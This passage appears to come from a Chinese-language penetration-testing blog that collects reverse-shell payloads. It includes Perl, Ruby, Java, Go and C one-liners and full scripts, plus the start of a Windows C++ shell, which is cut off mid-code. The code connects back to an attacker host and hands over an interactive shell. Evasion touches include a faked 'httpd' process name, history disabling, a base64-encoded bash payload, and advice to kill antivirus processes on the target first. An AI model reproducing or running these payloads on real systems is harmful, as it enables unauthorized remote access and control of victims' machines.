+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;[host]:[port]&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>完整perl反弹shell脚本：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell.  Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any</span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="regexp">qr(^127\.0\.0\.1$)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declarations</span></span><br><span class="line"><span class="keyword">my</span> $global_page = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $fake_process_name = <span class="string">&quot;/usr/sbin/apache&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change the process name to be less conspicious</span></span><br><span class="line">$0 = <span class="string">&quot;[httpd]&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">defined</span>($ENV&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125;)) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Browser IP address appears to be: $ENV&#123;&#x27;REMOTE_ADDR&#x27;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">&quot;ERROR: Your client isn&#x27;t authorised to view this page&quot;</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;ERROR: Authentication is enabled, but I couldn&#x27;t determine your IP address.  Denying access&quot;</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">&#x27;tcp&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Sent reverse shell to $ip:$port&quot;</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Couldn&#x27;t open reverse shell to $ip:$port: $!&quot;</span>);</span><br><span class="line">    cgiexit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line">$ENV&#123;<span class="string">&#x27;HISTFILE&#x27;</span>&#125; = <span class="string">&#x27;/dev/null&#x27;</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;w;uname -a;id;pwd&quot;</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">&quot;/bin/sh&quot;</span>&#125; ($fake_process_name, <span class="string">&quot;-i&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">&quot;&lt;p&gt;\n&quot;</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don&#x27;t give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Content-Length: &quot;</span> . <span class="keyword">length</span>($global_page) . <span class="string">&quot;\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Type: text\/html\r\n\r\n&quot;</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><p>不常用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;[host]&quot;,[port]).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>不依赖&#x2F;bin&#x2F;bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;[host]&quot;,&quot;[port]&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>适用Windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;[host]&quot;,&quot;[port]&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>完整ruby反弹shell脚本(MSF模块自带):</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env ruby</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;socket&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;open3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Set the Remote Host IP</span></span><br><span class="line"><span class="variable constant_">RHOST</span> = <span class="string">&quot;192.168.1.10&quot;</span> </span><br><span class="line"><span class="comment">#Set the Remote Host Port</span></span><br><span class="line"><span class="variable constant_">PORT</span> = <span class="string">&quot;6667&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Tries to connect every 20 sec until it connects.</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">sock = <span class="title class_">TCPSocket</span>.new <span class="string">&quot;<span class="subst">#&#123;<span class="variable constant_">RHOST</span>&#125;</span>&quot;</span>, <span class="string">&quot;<span class="subst">#&#123;<span class="variable constant_">PORT</span>&#125;</span>&quot;</span></span><br><span class="line">sock.puts <span class="string">&quot;We are connected!&quot;</span></span><br><span class="line"><span class="keyword">rescue</span></span><br><span class="line">  sleep <span class="number">20</span></span><br><span class="line">  <span class="keyword">retry</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Runs the commands you type and sends you back the stdout and stderr.</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  <span class="keyword">while</span> line = sock.gets</span><br><span class="line">    <span class="title class_">Open3</span>.popen2e(<span class="string">&quot;<span class="subst">#&#123;line&#125;</span>&quot;</span>) <span class="keyword">do</span> |<span class="params"> stdin, stdout_and_stderr </span>|</span><br><span class="line">              <span class="variable constant_">IO</span>.copy_stream(stdout_and_stderr, sock)</span><br><span class="line">              <span class="keyword">end</span>  </span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">rescue</span></span><br><span class="line">  <span class="keyword">retry</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>base64写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/[host]/[port];cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
+
+<p><strong>完整过程：</strong></p>
+<ul>
+<li><p>编辑ReverseShell.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReverseShell</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/[host]/[port];cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编译执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac ReverseShell,java</span><br><span class="line">java ReverseShell</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>得到shell</p>
+</li>
+</ul>
+<h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有个工具：https://github.com/TheKingOfDuck/ReverseGoShell/</span><br><span class="line">使用说明：https://blog.thekingofduck.com/post/ReverseGoShell/</span><br></pre></td></tr></table></figure>
+
+<p>脚本执行：</p>
+<ul>
+<li><p>编写脚本</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filename: ReverseShell.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net&quot;</span>       <span class="comment">// requirement to establish a connection</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span>        <span class="comment">// requirement to call os.Exit()</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span>   <span class="comment">// requirement to execute commands against the target system</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Connecting back to the attacker</span></span><br><span class="line">    <span class="comment">// If it fails, we exit the program</span></span><br><span class="line">    conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;192.168.0.23:2233&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creating a /bin/sh process</span></span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    <span class="comment">// Connecting stdin and stdout</span></span><br><span class="line">    <span class="comment">// to the opened connection</span></span><br><span class="line">    cmd.Stdin = conn</span><br><span class="line">    cmd.Stdout = conn</span><br><span class="line">    cmd.Stderr = conn</span><br><span class="line">    <span class="comment">// Run the process</span></span><br><span class="line">    cmd.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编译执行</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ go build ReverseShell.go</span><br><span class="line">$ ./ReverseShell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>得到shell</li>
+</ul>
+<p>还有更为完整的版本，详情可以看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhangb8042/articles/10795123.html">https://www.cnblogs.com/zhangb8042/articles/10795123.html</a></p>
+<h2 id="gcc-c"><a href="#gcc-c" class="headerlink" title="gcc(c)"></a>gcc(c)</h2><ul>
+<li><p>脚本（linux版本）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//filename:ReverseShell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> tcp_port = <span class="number">6666</span>;</span><br><span class="line"><span class="type">char</span> *ip = <span class="string">&quot;192.168.17.129&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">                addr.sin_family = AF_INET;</span><br><span class="line">                addr.sin_port = htons(tcp_port);</span><br><span class="line">                addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">                fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> ( connect(fd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dup2(fd, <span class="number">0</span>);</span><br><span class="line">                dup2(fd, <span class="number">1</span>);</span><br><span class="line">                dup2(fd, <span class="number">2</span>);</span><br><span class="line">                execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">        reverse_shell();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>kali开启监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>gcc编译：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ReverseShell.c -o ReverseShell</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>成功得到shell</p>
+</li>
+</ul>
+<h2 id="g-c"><a href="#g-c" class="headerlink" title="g++(c++)"></a>g++(c++)</h2><p>此方法可能被杀，使用前先查看目标上是否有杀软，先给他把他妈的进程kill掉，tasklist，taskkill</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;synchapi.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">SOCKET Winsock;</span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> hax; <span class="comment">// 地址结构</span></span><br><span class="line"><span class="type">char</span> ip_addr[<span class="number">16</span>] = <span class="string">&quot;*.*.*.*&quot;</span>; <span class="comment">// ip地址（或者主机名）</span></span><br><span class="line"><span class="type">char</span> port[<span class="number">6</span>] = <span class="string">&quot;8888&quot;</span>;              <span class="comment">// 端口</span></span><br><span class="line"><span class="comment">// 指定新进程主窗口的特性</span></span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回有关新进程及其主线程的信息</span></span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span>&#123;   </span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        err = <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">        <span class="keyword">if</span>(err != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed with error: %d\n&quot;</span>, err);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Winsock = <span class="built_in">WSASocket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="literal">NULL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(Winsock==INVALID_SOCKET)&#123;</span><br><span class="line">            <span class="built_in">wprintf</span>(<span class="string">L&quot;WSASocket function failed with error = %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>() );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">struct</span> hostent *host; <span class="comment">// 黑客主机信息</span></span><br><span class="line">            host = <span class="built_in">gethostbyname</span>(ip_addr);</span><br><span class="line">            <span class="built_in">strcpy_s</span>(ip_addr, <span class="built_in">inet_ntoa</span>(*((<span class="keyword">struct</span> in_addr *)host-&gt;h_addr)));</span><br><span class="line">            hax.sin_family = AF_INET;</span><br><span class="line">            hax.sin_port = <span class="built_in">htons</span>(<span class="built_in">atoi</span>(port));</span><br><span class="line">            hax.sin_addr.s_addr = <span class="built_in">inet_addr</span>(ip_addr);</span><br><span class="line">            <span class="built_in">memset</span>(&amp;hax.sin_zero, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">            err = <span class="built_in">connect</span>(Winsock, (<span class="keyword">struct</span> sockaddr *)&amp;hax, <span class="built_in">sizeof</span>(<span class="keyword">struct</span> sockaddr));</span><br><span class="line">            <span class="keyword">if</span> (err == SOCKET_ERROR) &#123;</span><br><span class="line">                <span class="built_in">wprintf</span>(<span class="string">L&quot;connect function failed with error: %ld\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">memset</span>(&amp;ini_processo, <span class="number">0</span>, <span class="built_in">sizeof</span>(ini_processo)); <span 